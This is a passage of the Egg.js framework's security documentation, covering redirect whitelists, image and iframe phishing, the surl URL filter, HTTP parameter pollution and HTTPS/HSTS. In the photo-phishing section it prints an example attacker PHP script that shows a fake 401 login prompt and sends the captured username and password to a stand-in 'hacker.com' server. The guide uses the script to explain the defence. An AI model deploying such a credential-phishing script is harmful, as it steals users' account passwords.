+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// config/config.default.js</span></span><br><span class="line">exports.security = &#123;</span><br><span class="line">  domainWhiteList:[<span class="string">'.domain.com'</span>],  <span class="comment">// security domain while list, start with .</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>If user did not configure <code>domainWhiteList</code> or <code>domainWhiteList</code> array is empty, default will release all redirect requests, that is equal to <code>ctx.unsafeRedirect(url)</code></p>
+<h3 id="photo-phishing"><a class="markdown-anchor" href="#photo-phishing">#</a> Photo Phishing</h3>
+<p>If website allow users insert unverified images into the web page, that will make a risk of Phishing.</p>
+<p>Like common <code>401 Phishing</code> for example, when user accessing the page, it pops up a verification page to let user input account and password, when user input, account and password will be stored in the hacker's server.</p>
+<p>Usually this kind of situation will appear in <code>&lt;img src=$url /&gt;</code>, and not verify the <code>$url</code> whether within the domain name white list.</p>
+<p>Attacker can construct the following code in his own server:</p>
+<p>401.php, used to pop up 401 window, then record user information:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">'WWW-Authenticate: Basic realm="No authorization"'</span>);</span><br><span class="line">    header(<span class="string">'HTTP/1.1 401 Unauthorized'</span>);</span><br><span class="line">        $domain = <span class="string">"http://hacker.com/fishing/"</span>;</span><br><span class="line">        <span class="keyword">if</span> ($_SERVER[sectech:<span class="string">'PHP_AUTH_USER'</span>] !== <span class="keyword">null</span>)&#123;</span><br><span class="line">                header(<span class="string">"Location: "</span>.$domain.<span class="string">"record.php?a="</span>.$_SERVER[sectech:<span class="string">'PHP_AUTH_USER'</span>].<span class="string">"&amp;b="</span>.$_SERVER[sectech:<span class="string">'PHP_AUTH_PW'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Then attacker generate an image url<code>&lt;img src=&quot;http://xxx.xxx.xxx/fishing/401.php?a.jpg//&quot; /&gt;</code>.</p>
+<p>If user access the page, it will popup a window, and let user type in user's name and password, then account and password will be stored in the hacker's server.</p>
+<h3 id="prevention-6"><a class="markdown-anchor" href="#prevention-6">#</a> Prevention</h3>
+<p>Framework provides <code>.surl()</code> macro to do url filtering.It is Used to parse the url in the HTML tags in place (such as <code>&lt;a href =&quot;&quot; /&gt;&lt;img src=&quot;&quot;/&gt;</code>), other places are not allowed to use.</p>
+<p>You can add <code>helper.surl($value)</code> in the template to output variable.</p>
+<p><strong>note: in places where you need to parse the url, you must add double quotes outside of surl, or you will result in XSS vulnerabilities.</strong></p>
+<p>Do not use <code>surl</code></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$value"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>output:</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://ww.safe.com&lt;script&gt;"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Use <code>surl</code></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"helper.surl($value)"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>output:</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://ww.safe.com&amp;lt;script&amp;gt;"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="iframe-phishing"><a class="markdown-anchor" href="#iframe-phishing">#</a> Iframe Phishing</h3>
+<p><a href="https://www.owasp.org/index.php/Cross_Frame_Scripting" target="_blank" rel="noopener">Iframe Phishing</a> By embedding iframe into the hacked page, the attacker can direct users to click on the iframe's dangerous website or even cover it, affecting the normal function of the site and hijacking the user's click operation.</p>
+<p>Framework provides <code>X-Frame-Options</code> this security header to prevent iframe Phishing. The default value is <code>SAMEORIGIN</code>, which allows only the same domain to embed this page as an iframe.</p>
+<p>This configuration can be turned off when you need to embed some trusted third-party web pages.</p>
+<h2 id="prevention-of-security-threats-hpp"><a class="markdown-anchor" href="#prevention-of-security-threats-hpp">#</a> Prevention of Security threats <code>HPP</code></h2>
+<p>HTTP protocol allows the parameters of the same name appears many times, due to the implementation of the application is not standard, the attacker from the distribution of parameters of transmission key and the value of different parameters, will cause to bypass the consequences of some protection.</p>
+<p>The possible security threats to HPP are:</p>
+<ul>
+<li>bypass protection and parameter checking.</li>
+<li>generate logical vulnerabilities and errors that affect application code execution.</li>
+</ul>
+<h3 id="more-2"><a class="markdown-anchor" href="#more-2">#</a> More</h3>
+<ul>
+<li>https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)</li>
+<li>http://blog.csdn.net/eatmilkboy/article/details/6761407</li>
+<li>https://media.blackhat.com/bh-us-11/Balduzzi/BH_US_11_Balduzzi_HPP_WP.pdf</li>
+<li>ebay RCE risk：http://secalert.net/2013/12/13/ebay-remote-code-execution/</li>
+</ul>
+<h3 id="how-to-protect"><a class="markdown-anchor" href="#how-to-protect">#</a> How to Protect</h3>
+<p>The framework itself forces the use of the first parameter when the client transports the same key and value different parameters, so it does not lead to an HPP attack.</p>
+<h2 id="man-in-middle-attack"><a class="markdown-anchor" href="#man-in-middle-attack">#</a> <a href="https://www.owasp.org/index.php/Man-in-the-middle_attack" target="_blank" rel="noopener">man-in-middle attack</a> with HTTP / HTTPS</h2>
+<p>HTTP is a widely used protocol for Web applications, responsible for Web content requests and acquisitions. Content request will across lots of &quot;middleman&quot;, mainly in network link, ACTS as the content of the entrance to the browser, router, WIFI providers, communications operators. if you use a proxy, over the wall software will introduce more &quot;middleman&quot;. Because the path and parameters of the HTTP request are explicitly written, these &quot;middleman&quot; can monitor, hijack, and block HTTP requests, it is called man-in-middle attack.</p>
+<p>In the absence of HTTPS, ISPs can jump the link directly to an AD when the user initiates a request, or change the search results directly into their own ads. If there is a BUG in the hijacking code, the user will not be able to use the website, the white screen will appear.</p>
+<p>Data leakage, request hijacking, content tampering, etc., the core reason is that HTTP is completely naked, and the domain name, path and parameters are clearly visible to the middle people. HTTPS does this by encrypting requests to make them more secure to users. In addition to protecting the interests of users, it can also avoid the traffic being held hostage to protect its own interests.</p>
+<p>Although HTTPS is not absolute security, the organization that holds the root certificate and the organization that controls the encryption algorithm can also conduct a man-in-middle attack. But HTTPS is the most secure solution under the current architecture, and it significantly increases the cost of man-in-middle attack.</p>
+<p>So, if you use the Egg framework to develop web site developers, please be sure to update your website to HTTPS.</p>
+<p>For HTTPS, one should pay attention to is the HTTP transport security (HSTS) strictly, if you don't use HSTS, when a user input url in the browser without HTTPS, the browser will use HTTP access by default.</p>
+<p>Framework provides <code>HSTS Strict-Transport-security</code>, this header will be opened by default, then let the HTTPS site not redirect to HTTP. If your site supports HTTPS, be sure to open it.If our Web site is an HTTP site, we need to close this header.</p>
+<p>The configuration is as follows:</p>
+<ul>
+<li>maxAge one yeah for default <code>365 * 24 * 3600</code>。</li>
+<li>includeSubdomains default is false, you can add subdomain to confirm all subdomains could be accessed by HTTPS.</li>
+</ul>
+<h2 id="other-build-in-security-tools"><a class="markdown-anchor" href="#other-build-in-security-tools">#</a> Other build-in security tools</h2>
+<h3 id="ctxissafedomaindomain"><a class="markdown-anchor" href="#ctxissafedomaindomain">#</a> ctx.isSafeDomain(domain)</h3>
+<p>To judge whether a domain is a secure domain. It is configured in the security  configuration, see <code>ctx.redirect</code> parts.</p>
+<h3 id="appinjectcsrfstr"><a class="markdown-anchor" href="#appinjectcsrfstr">#</a> app.injectCsrf(str)</h3>
+<p>This function provides template preprocessing - the ability to automatically insert CSRF key, which can be automatically inserted CSRF hidden input into all of the form tags, then user will not need to manually write it.</p>
+<h3 id="appinjectnoncestr"><a class="markdown-anchor" href="#appinjectnoncestr">#</a> app.injectNonce(str)</h3>
+<p>This function provides the template pretreatment - automatically inserted into the <code>nonce</code> ability, if the site opens <code>CSP</code> safety http header, and want to use <code>CSP 2.0 nonce</code> features, you can use this function. Reference <a href="https://www.zhihu.com/question/21979782" target="_blank" rel="noopener">CSP</a>.</p>
+<p>This function scans the script tag in the template and automatically adds <code>nonce</code>.</p>
+<h3 id="appinjecthijackingdefensestr"><a class="markdown-anchor" href="#appinjecthijackingdefensestr">#</a> app.injectHijackingDefense(str)</h3>
+<p>For sites that do not open HTTPS, this function can be limited to preventing ISP hijacking.</p>
+
+  </article>
+  <aside id="mobileAside" class="toc">
+  <div class="mobile-menu">
+    <ul><li><a href="intro/" alt="Guide">Guide</a></li><li><a href="/api/" alt="API">API</a></li><li><a href="tutorials/index.html" alt="Tutorials">Tutorials</a></li><li><a href="https://github.com/search?q=topic%3Aegg-plugin&type=Repositories" alt="Plugins">Plugins</a></li><li><a href="https://github.com/eggjs/egg/releases" alt="Release">Release</a></li></ul>
+  </div>
+  <dl><dt>Guide</dt><dd><ul><li><a href="/en/intro/index.html">What is Egg?</a></li><li><a href="/en/intro/egg-and-koa.html">Egg and Koa</a></li><li><a href="/en/intro/quickstart.html">Quick Start</a></li><li><a href="/en/tutorials/progressive.html">Progressive</a></li><li><a href="/en/migration.html">Migration to 2.x</a></li></ul></dd><dt>Basis Function</dt><dd><ul><li><a href="/en/basics/structure.html">Directory Structure</a></li><li><a href="/en/basics/objects.html">Built-in Objects</a></li><li><a href="/en/basics/env.html">Environment</a></li><li><a href="/en/basics/config.html">Configuration</a></li><li><a href="/en/basics/middleware.html">Middleware</a></li><li><a href="/en/basics/router.html">Router</a></li><li><a href="/en/basics/controller.html">Controller</a></li><li><a href="/en/basics/service.html">Service</a></li><li><a href="/en/basics/plugin.html">Plugin</a></li><li><a href="/en/basics/schedule.html">Schedule</a></li><li><a href="/en/basics/extend.html">Extend</a></li><li><a href="/en/basics/app-start.html">Custom Init</a></li></ul></dd><dt>Core</dt><dd><ul><li><a href="/en/core/development.html">Development</a></li><li><a href="/en/core/unittest.html">Unit Testing</a></li><li><a href="/en/core/deployment.html">การพัฒนาเพื่อปรับใช้</a></li><li><a href="/en/core/logger.html">Logger</a></li><li><a href="/en/core/httpclient.html">HttpClient</a></li><li><a href="/en/core/cookie-and-session.html">Cookie and Session</a></li><li><a href="/en/core/cluster-and-ipc.html">Cluster and IPC</a></li><li><a href="/en/core/view.html">View</a></li><li><a href="/en/core/error-handling.html">Error Handling</a></li><li><a href="/en/core/security.html">Security</a></li><li><a href="/en/core/i18n.html">i18n</a></li></ul></dd><dt>Tutorials</dt><dd><ul><li><a href="/en/tutorials/mysql.html">MySQL</a></li><li><a href="/en/tutorials/restful.html">RESTful API</a></li></ul></dd><dt>Advanced</dt><dd><ul><li><a href="/en/advanced/loader.html">Loader</a></li><li><a href="/en/advanced/plugin.html">Plugin Development</a></li><li><a href="/en/advanced/framework.html">Framework</a></li><li><a href="/en/advanced/cluster-client.html">Cluster Enhancement</a></li><li><a href="/en/advanced/view-plugin.html">View Plugin</a></li><li><a href="/en/style-guide.html">Style Guide</a></li></ul></dd><dt>Community</dt><dd><ul><li><a href="/en/plugins/">รายการปลั๊กอิน</a></li><li><a href="/en/contributing.html">Contributing</a></li><li><a href="/en/resource.html">ทรัพยากร</a></li><li><a href="/en/faq.html">FAQ</a></li></ul></dd></dl>
+</aside>
+<script>
+var mobileTrigger = document.getElementById('mobileTrigger');
+var mobileAside = document.getElementById('mobileAside');
+mobileTrigger.onclick = function(e) {
+  if (mobileAside.className.indexOf('mobile-show') === -1) {
+    mobileAside.className += ' mobile-show';
+  } else {
+    mobileAside.className = 'toc';
+  }
+};
+</script>
+
+</div>
+
+  </div>
+</body>
+<script src="https://cdn.jsdelivr.net/docsearch.js/2/docsearch.min.js"></script>
+<script>
+docsearch({
+  apiKey: '1561de31a86f79507ea00cdb54ce647c',
+  indexName: 'eggjs',
+  inputSelector: '#search-query',
+});
+</script>
+<div class="cnzz">
+<script src="https://s11.cnzz.com/z_stat.php?id=1261142226&web_id=1261142226" language="JavaScript"></script>
+</div>
+
+</html>
